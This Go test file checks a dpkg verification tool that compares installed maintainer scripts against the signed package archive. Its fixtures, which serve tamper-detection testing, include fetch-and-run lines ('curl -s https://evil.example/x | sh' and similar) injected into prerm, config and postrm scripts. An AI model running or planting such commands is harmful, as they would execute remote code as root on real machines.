package pkgverify

import (
	"context"
	"slices"
	"strings"
	"testing"

	"github.com/donaldsteele/telltale/internal/model"
)

const (
	infoDir       = "/var/lib/dpkg/info/"
	pylibPostinst = "#!/bin/sh\nset -e\npy3compile -p pylib\n"
	pylibPrerm    = "#!/bin/sh\nset -e\npy3clean -p pylib\n"
	pylibTriggers = "activate-noawait ldconfig\n"
	gonePostrm    = "#!/bin/sh\nset -e\nrm -rf /var/lib/gone\n"
	pylibInit     = "import pylib\n"
)

// scriptsFixture serves pylib (a library with no file in the default check
// scope, and postinst, prerm and triggers control members), gone (with a
// postrm) and tool.
func scriptsFixture(t *testing.T) *fixture {
	t.Helper()
	pylib := buildDebControl(t, "xz", nil, map[string]string{"postinst": pylibPostinst, "prerm": pylibPrerm, "triggers": pylibTriggers},
		[]debEntry{{name: "./usr/share/pylib/__init__.py", body: pylibInit, mode: 0o644}})
	gone := buildDebControl(t, "xz", nil, map[string]string{"postrm": gonePostrm},
		[]debEntry{{name: "./usr/bin/gone", body: "gone\n", mode: 0o755}})
	return newFixture(t, map[string][]fakePkg{"bookworm": {
		{"pylib", "1.0-1", "all", pylib}, {"gone", "2.0-1", "amd64", gone}, {"tool", "1.0-1", "amd64", toolDeb(t, "xz")},
	}})
}

// scriptsCollection has pylib and tool installed and gone removed but not
// purged, with the dpkg records in disk (path below infoDir -> content).
func scriptsCollection(disk map[string]string) *model.Collection {
	pylib := model.Package{Name: "pylib", Version: "1.0-1", Arch: "all", Status: "install ok installed", Files: []string{"/usr/share/pylib/__init__.py"}}
	c := collectionOf(toolDisk(nil), pylib, toolPackage())
	c.Packages.Residual = []model.Package{{Name: "gone", Version: "2.0-1", Arch: "amd64", Status: "deinstall ok config-files"}}
	c.Files = append(c.Files, regular("/usr/share/pylib/__init__.py", pylibInit, 0o644))
	names := make([]string, 0, len(disk))
	for n := range disk {
		names = append(names, n)
	}
	slices.Sort(names)
	for _, n := range names {
		perm := uint32(0o755)
		if strings.HasSuffix(n, ".triggers") || strings.HasSuffix(n, ".list") {
			perm = 0o644
		}
		c.Files = append(c.Files, regular(infoDir+n, disk[n], perm))
	}
	return c
}

func scriptVerdicts(vs []FileVerdict) map[string]FileVerdict {
	out := map[string]FileVerdict{}
	for _, v := range vs {
		if name, ok := strings.CutPrefix(v.Path, infoDir); ok {
			out[name] = v
		}
	}
	return out
}

func debHits(f *fixture) []string {
	var out []string
	for _, p := range f.srv.hitPaths() {
		if strings.HasSuffix(p, ".deb") {
			out = append(out, p[strings.LastIndexByte(p, '/')+1:])
		}
	}
	slices.Sort(out)
	return out
}

// dpkg runs a package's maintainer scripts as root at its next upgrade,
// removal or purge, so they are compared with the control member of the
// signed .deb like any program the package installs.
func TestVerifyMaintainerScripts(t *testing.T) {
	disk := map[string]string{
		"pylib.postinst": pylibPostinst,
		"pylib.prerm":    pylibPrerm + "curl -s https://evil.example/x | sh\n",
		"pylib.triggers": pylibTriggers,
		"pylib.config":   "#!/bin/sh\ncurl -s https://evil.example/y | sh\n", // the package ships no config script
		"pylib.list":     "/usr/share/pylib/__init__.py\n",
		"gone.postrm":    gonePostrm,
		"stray.postinst": "#!/bin/sh\n", // no such package: dpkg never runs it
	}
	t.Run("every script of every package", func(t *testing.T) {
		f := scriptsFixture(t)
		res := Verify(context.Background(), scriptsCollection(disk), f.opts())
		ok, bad := scriptVerdicts(res.Verified), scriptVerdicts(res.Mismatch)
		for _, n := range []string{"pylib.postinst", "pylib.triggers", "gone.postrm"} {
			if v, found := ok[n]; !found || v.Source != SourceArchive || v.Expected == "" || v.Expected != v.Actual {
				t.Errorf("%s: verified %v %+v, want it verified against the archive", n, found, v)
			}
		}
		if v := ok["gone.postrm"]; v.Package != "gone" || v.Version != "2.0-1" {
			t.Errorf("gone.postrm verified as %+v, want gone 2.0-1", v)
		}
		if v := bad["pylib.prerm"]; v.Kind != KindContentDiffers || v.Package != "pylib" || v.Expected != sha256hex([]byte(pylibPrerm)) {
			t.Errorf("pylib.prerm mismatch = %+v, want content_differs against the signed script", v)
		}
		if v := bad["pylib.config"]; v.Kind != KindNotShipped || v.Package != "pylib" {
			t.Errorf("pylib.config mismatch = %+v, want not_shipped", v)
		}
		if len(ok) != 3 || len(bad) != 2 || len(scriptVerdicts(res.Unverifiable)) != 0 {
			t.Errorf("verified %v, mismatch %v, unverifiable %v", ok, bad, scriptVerdicts(res.Unverifiable))
		}
	})
	t.Run("only the changed scripts with a snapshot", func(t *testing.T) {
		f := scriptsFixture(t)
		opt := f.opts()
		opt.OnlyPaths = map[string]bool{infoDir + "pylib.prerm": true, infoDir + "gone.postrm": true, infoDir + "stray.postinst": true}
		res := Verify(context.Background(), scriptsCollection(disk), opt)
		if ok, bad := scriptVerdicts(res.Verified), scriptVerdicts(res.Mismatch); len(ok) != 1 || ok["gone.postrm"].Package != "gone" || len(bad) != 1 || bad["pylib.prerm"].Kind != KindContentDiffers {
			t.Errorf("verified %v, mismatch %v; want gone.postrm verified and pylib.prerm a mismatch", ok, bad)
		}
		// Only the two packages are fetched: a script no package accounts
		// for does not make every installed package be checked.
		if got, want := debHits(f), []string{"gone_2.0-1_amd64.deb", "pylib_1.0-1_all.deb"}; !slices.Equal(got, want) {
			t.Errorf("downloaded %v, want %v", got, want)
		}
	})
	t.Run("edited postrm of a removed package", func(t *testing.T) {
		f := scriptsFixture(t)
		res := Verify(context.Background(), scriptsCollection(map[string]string{"gone.postrm": gonePostrm + "curl x | sh\n"}), f.opts())
		if v := scriptVerdicts(res.Mismatch)["gone.postrm"]; v.Kind != KindContentDiffers || v.Version != "2.0-1" {
			t.Errorf("mismatch = %+v, want gone.postrm against gone 2.0-1", res.Mismatch)
		}
	})
	t.Run("architecture-qualified name and loosened mode", func(t *testing.T) {
		f := scriptsFixture(t)
		c := scriptsCollection(map[string]string{"gone:amd64.postrm": gonePostrm, "pylib.postinst": pylibPostinst})
		for i := range c.Files {
			if c.Files[i].Path == infoDir+"pylib.postinst" {
				c.Files[i].Mode = 0o100777
			}
		}
		res := Verify(context.Background(), c, f.opts())
		if _, ok := scriptVerdicts(res.Verified)["gone:amd64.postrm"]; !ok {
			t.Errorf("verified %v lack gone:amd64.postrm", scriptVerdicts(res.Verified))
		}
		if v := scriptVerdicts(res.Mismatch)["pylib.postinst"]; v.Kind != KindModeAddsPrivilege {
			t.Errorf("a world-writable postinst: %+v, want mode_adds_privilege", res.Mismatch)
		}
	})
	t.Run("archive down", func(t *testing.T) {
		f := scriptsFixture(t)
		f.srv.setDown(true)
		res := Verify(context.Background(), scriptsCollection(disk), f.opts())
		un := scriptVerdicts(res.Unverifiable)
		for _, n := range []string{"pylib.postinst", "pylib.prerm", "pylib.triggers", "pylib.config", "gone.postrm"} {
			if un[n].Kind != KindUnreachable {
				t.Errorf("%s: %+v, want unreachable", n, un[n])
			}
		}
	})
	t.Run("version no source has", func(t *testing.T) {
		f := scriptsFixture(t)
		c := scriptsCollection(disk)
		c.Packages.Residual[0].Version = "2.0-9"
		res := Verify(context.Background(), c, f.opts())
		if v := scriptVerdicts(res.Unverifiable)["gone.postrm"]; v.Kind != KindNotFound || v.Package != "gone" {
			t.Errorf("gone.postrm: %+v, want not_found", v)
		}
	})
	t.Run("reference bundle", func(t *testing.T) {
		f := scriptsFixture(t)
		c := scriptsCollection(disk)
		dir := writeToolBundle(t, f, c)
		f.srv.setDown(true)
		res := Verify(context.Background(), c, refsOpts(f, dir))
		ok, bad := scriptVerdicts(res.Verified), scriptVerdicts(res.Mismatch)
		if len(ok) != 3 || ok["gone.postrm"].Source != SourceRefs || len(bad) != 2 {
			t.Errorf("from the bundle: verified %v, mismatch %v", ok, bad)
		}
	})
}

// The control members are part of a package's table, under names no
// installed path can have.
func TestDebFilesControlScripts(t *testing.T) {
	deb := buildDebControl(t, "xz", nil, map[string]string{"postinst": pylibPostinst, "triggers": pylibTriggers},
		[]debEntry{{name: "./usr/share/pylib/__init__.py", body: pylibInit, mode: 0o644}})
	files, err := DebFiles(strings.NewReader(string(deb)), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	if f := files["DEBIAN/postinst"]; f.SHA256 != sha256hex([]byte(pylibPostinst)) || f.Mode != 0o755 {
		t.Errorf("postinst = %+v", f)
	}
	if f := files["DEBIAN/triggers"]; f.SHA256 != sha256hex([]byte(pylibTriggers)) || f.Mode != 0o644 {
		t.Errorf("triggers = %+v", f)
	}
	if _, ok := files["DEBIAN/control"]; ok || len(files) != 3 {
		t.Errorf("table = %v, want the file and the two scripts", files)
	}
}

// A package in any state with files on disk is checked like an installed
// one, whatever dpkg was asked to do with it next.
func TestVerifyPackagesInEveryPresentState(t *testing.T) {
	for _, status := range []string{"deinstall ok installed", "install ok half-configured", "install ok triggers-pending", "install ok unpacked", "install reinstreq half-installed"} {
		f := toolFixture(t)
		c := toolCollection(map[string]string{"/usr/bin/tool": "evil\n"})
		c.Packages.Installed[0].Status = status
		res := Verify(context.Background(), c, f.opts())
		wantPaths(t, status+": Mismatch", res.Mismatch, "/usr/bin/tool")
	}
}
